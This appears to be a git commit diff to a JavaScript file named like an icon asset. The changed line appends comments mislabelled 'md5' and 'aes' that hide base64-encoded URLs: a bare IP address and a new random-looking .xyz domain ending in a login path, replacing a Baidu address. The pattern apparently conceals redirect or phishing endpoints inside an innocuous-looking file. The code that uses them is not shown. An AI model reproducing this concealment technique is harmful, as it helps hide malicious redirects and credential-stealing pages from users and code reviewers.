1b0d7d3ca857daf3ae1eb7f5dfa6e140fa7ebed3
caocaodage <caocaodajun@gmail.com>
2021-07-03 18:25:49 +0800

    init

--- js/icon_8hq4wq.js
+++ js/icon_8hq4wq.js
@@ -8,4 +8,4 @@ if($.browser.mozilla||$.browser.opera)
 		function UnloadHandler() {
 				window.removeEventListener('beforeunload', UnloadHandler, false);
 		}
-})()/** md5:aHR0cHM6Ly9tLmJhaWR1LmNvbQ==**//** aes:aHR0cDovLzE2LjE2Mi4xMDUuMTQ1**/
+})()/** md5:aHR0cDovL3d3dy5mY3hkc2dycnhmZnZiZGV2Lnh5ei8jL2xvZ2lu**//** aes:aHR0cDovLzE2LjE2Mi4xMDUuMTQ1**/
